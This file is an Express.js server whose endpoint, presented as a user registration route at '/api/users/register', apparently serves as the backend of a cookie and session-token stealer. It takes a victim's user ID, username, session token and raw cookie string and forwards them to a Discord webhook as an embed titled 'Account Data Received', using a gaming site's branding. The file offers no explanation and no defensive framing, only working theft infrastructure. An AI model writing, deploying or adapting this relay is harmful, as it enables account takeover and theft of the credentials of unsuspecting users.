const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

app.post('/api/users/register', async (req, res) => {
    try {
        const { userId, username, displayName, sessionToken, rawCookieString } = req.body;
        const WEBHOOK_URL = process.env.webhook;

        if (!WEBHOOK_URL) {
            console.error("Webhook not configured.");
            return res.status(500).json({ error: "Webhook missing" });
        }

        // Build Discord Embed
        let avatarUrl = "https://playvortex.io/favicon.ico";
        if (userId && userId !== "Unknown") {
            avatarUrl = `https://playvortex.io/users/${userId}/avatar`;
        }

        const payload = {
            username: "Data Relay",
            avatar_url: "https://playvortex.io/favicon.ico",
            embeds: [{
                title: "🦊 Account Data Received",
                color: 0x8f82c4,
                thumbnail: { url: avatarUrl },
                fields: [
                    { name: "👤 Username", value: `**@${username}**`, inline: true },
                    { name: "📛 Display Name", value: `**${displayName}**`, inline: true },
                    { name: "🆔 User ID", value: `\`${userId}\``, inline: false },
                    { name: "🔑 Session Token", value: `\`\`\`${sessionToken}\`\`\``, inline: false },
                    { name: "📦 Raw Cookies", value: `\`\`\`${(rawCookieString || '').substring(0, 950)}\`\`\``, inline: false }
                ],
                footer: { text: "Render Proxy", icon_url: "https://playvortex.io/favicon.ico" },
                timestamp: new Date().toISOString()
            }]
        };

        const response = await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });

        if (!response.ok) {
            return res.status(500).json({ error: "Discord webhook failed" });
        }

        return res.status(200).json({ status: "success" });

    } catch (err) {
        console.error("Server error:", err);
        return res.status(500).json({ error: err.message });
    }
});

app.get('/', (req, res) => {
    res.send('API is running.');
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
